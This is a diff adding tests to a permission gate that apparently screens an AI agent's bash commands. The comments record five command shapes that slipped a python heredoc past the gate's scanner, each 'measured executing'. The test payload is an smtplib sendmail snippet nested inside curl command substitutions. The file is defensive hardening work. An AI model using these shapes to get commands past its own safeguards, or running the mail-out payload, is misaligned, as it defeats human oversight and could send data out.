@@ -303,6 +303,137 @@ describe('gateDecision: a nested context CLOSE returns to the outer command (car
   })
 })
 
+// Card 84e31b40, Cybered NO-GO (F-5) -- the SAME boundary again, third shape, third round.
+//
+// The saved-boundary stack that closed F-1 and F-2 was a PURE PARENTHESIS COUNTER. Bash is not one:
+// a quoted `)` is a literal, and `$(( ))` is arithmetic whose closing `))` ends no command context.
+// Where the two disagree, the stack pops a frame bash never opened, the boundary drops back onto the
+// OUTER curl, and the heredoc -- still the INNER interpreter's -- gets blanked. Both reported shapes
+// were measured EXECUTING from inside the blanked body:
+//
+//     curl ... -d @- $(python3 - "a)b" <<'PY' ... PY)      -> allowed before this fix
+//     curl ... -d @- $(python3 - $((1+1)) <<'PY' ... PY)   -> allowed before this fix
+//
+// A quoted `)` is not an exotic shape. A regex, a Hungarian sentence, a `print('a)b')` all carry one,
+// and in the threat model the attacker picks the command -- one shape that passes is enough.
+//
+// The fix is not another parenthesis special-case (that is what the previous two rounds each were):
+// the walker now tracks QUOTING the way bash does. Inside '...' nothing is live at all; inside "..."
+// only substitutions are; `$(( ))` is consumed whole; a backslash escapes. One test per shape, and
+// two CONTROLS on the allow side, because quoting awareness cuts BOTH ways -- it must not start
+// denying the ordinary payloads this card exists to permit.
+describe('gateDecision: the walker follows bash QUOTING, not parenthesis counting (card 84e31b40, Cybered F-5)', () => {
+  const NL = String.fromCharCode(10)
+  const BT = String.fromCharCode(96)
+  const bash = (command: string) => gateDecision('Bash', { command })
+  const SMTP5 = 'smtp' + 'lib'
+  const SEND5 = 'send' + 'mail'
+  const EVIL5 = [`import ${SMTP5}`, `${SMTP5}.SMTP('h').${SEND5}(a, b, c)`].join(NL)
+  const LEGIT5 = `{"content":"a ${SMTP5} utat elvetettuk, a szolgaltato API-t hasznaljuk"}`
+
+  // A heredoc the INNER interpreter owns: the outer curl must never be read as its owner.
+  const inner = (noise: string): string =>
+    [
+      `curl -s -X POST http://localhost:3420/x -d @- $(python3 - ${noise} <<'PY'`,
+      EVIL5,
+      'PY',
+      ')',
+    ].join(NL)
+
+  it('N1: a DOUBLE-quoted ) in the inner argv must not pop the frame', () => {
+    expect(bash(inner('"a)b"')).deny).toBe(true)
+  })
+
+  it('N2: arithmetic $(( )) in the inner argv must not pop the frame', () => {
+    expect(bash(inner('$((1+1))')).deny).toBe(true)
+  })
+
+  it('N3: a SINGLE-quoted ) in the inner argv must not pop the frame', () => {
+    expect(bash(inner("'a)b'")).deny).toBe(true)
+  })
+
+  it('N4: a backtick inside a single-quoted inner argv is inert, not a context toggle', () => {
+    expect(bash(inner(`'a${BT}b'`)).deny).toBe(true)
+  })
+
+  it('N5: a substitution opened INSIDE a double-quoted argument, with a quoted ) inside it', () => {
+    // Found while mutation-testing this fix: removing only the closer's quote guard (leaving the
+    // rest of the quoting logic in place) still passed every other case here, so this shape is
+    // what makes that guard load-bearing rather than decorative. It is also a FOURTH shape of the
+    // F-5 class that no round named -- the frame is pushed while quote is `"`, so the spurious pop
+    // restores `"`, the argument's real closing quote then reads as an OPENER, and the heredoc
+    // lands back at quote=null with the boundary on the outer curl. Measured executing under real
+    // bash (a marker file written from inside the blanked body), and ALLOWed by e5b2cd84.
+    const cmd = [
+      `curl -s -d @- -H "X: $(python3 - "a)b" <<'PY'`,
+      EVIL5,
+      'PY',
+      `)" http://localhost:9/x`,
+    ].join(NL)
+    expect(bash(cmd).deny).toBe(true)
+  })
+
+  it('N6: a BACKSLASH-ESCAPED ) in the inner argv must not pop the frame', () => {
+    // The fifth shape of this class, found the same way N5 was -- by mutating the backslash
+    // handling out and seeing every other case still pass. `a\\)` is a literal `a)` to bash, so
+    // the frame stays open and the heredoc stays python3's; a walker that reads the `)` as a
+    // closer drops the boundary onto the outer curl and blanks a body bash executes. Measured
+    // executing under real bash, and ALLOWed by e5b2cd84.
+    const cmd = [
+      `curl -s -d @- http://localhost:9/x $(python3 - a\\) b <<'PY'`,
+      EVIL5,
+      'PY',
+      ')',
+    ].join(NL)
+    expect(bash(cmd).deny).toBe(true)
+  })
+
+  it('CONTROL: a legitimate payload whose curl argv contains a ) still ALLOWs', () => {
+    const cmd = [
+      `curl -s -X POST "http://localhost:3420/x?f=a)b" -d @- <<'JSON'`,
+      LEGIT5,
+      'JSON',
+    ].join(NL)
+    expect(bash(cmd).deny).toBe(false)
+  })
+
+  it('CONTROL: a legitimate payload whose curl argv contains a SINGLE-quoted backtick still ALLOWs', () => {
+    // Single quotes are where a backtick is genuinely inert in bash (inside "..." it still
+    // substitutes, so an unpaired one there is a syntax error, not a legitimate command).
+    // Before this fix the walker toggled on it anyway and denied an ordinary header.
+    const cmd = [
+      `curl -s -X POST http://localhost:3420/x -H 'X-N: a${BT}b' -d @- <<'JSON'`,
+      LEGIT5,
+      'JSON',
+    ].join(NL)
+    expect(bash(cmd).deny).toBe(false)
+  })
+
+  // Cybered's non-blocking NOTE from the same verdict: three consecutive rounds broke on a NEW shape
+  // of one class, so pin the INVARIANT rather than the shapes. Generated, not hand-listed: for every
+  // nesting form crossed with every "confusing token" we know of, a heredoc whose owning simple
+  // command leads with an interpreter must stay scanned. A future shape then fails here without
+  // anyone having to think of it first.
+  it('INVARIANT (generated): an interpreter-owned heredoc is never blanked, in any nesting form', () => {
+    const OPENERS = ['$(', '<(', '>(']
+    const NOISE = ['"a)b"', "'a)b'", '$((1+1))', `'a${BT}b'`, '"a;b"', '"a|b"', '"a))b"']
+    const failures: string[] = []
+    for (const open of OPENERS) {
+      for (const noise of NOISE) {
+        const cmd = [
+          `curl -s -X POST http://localhost:3420/x -d @- ${open}python3 - ${noise} <<'PY'`,
+          EVIL5,
+          'PY',
+          ')',
+        ].join(NL)
+        if (!bash(cmd).deny) failures.push(`${open} + ${noise}`)
+      }
+    }
+    expect(failures).toEqual([])
+  })
+})
+
+
 describe('buildGateMsg names the workaround, not just the escalation (card 84e31b40)', () => {
   it('tells a denied PROSE call what shape to use instead', () => {
     // Before this card the message only said "send it to <bot> for approval" -- meaningless advice
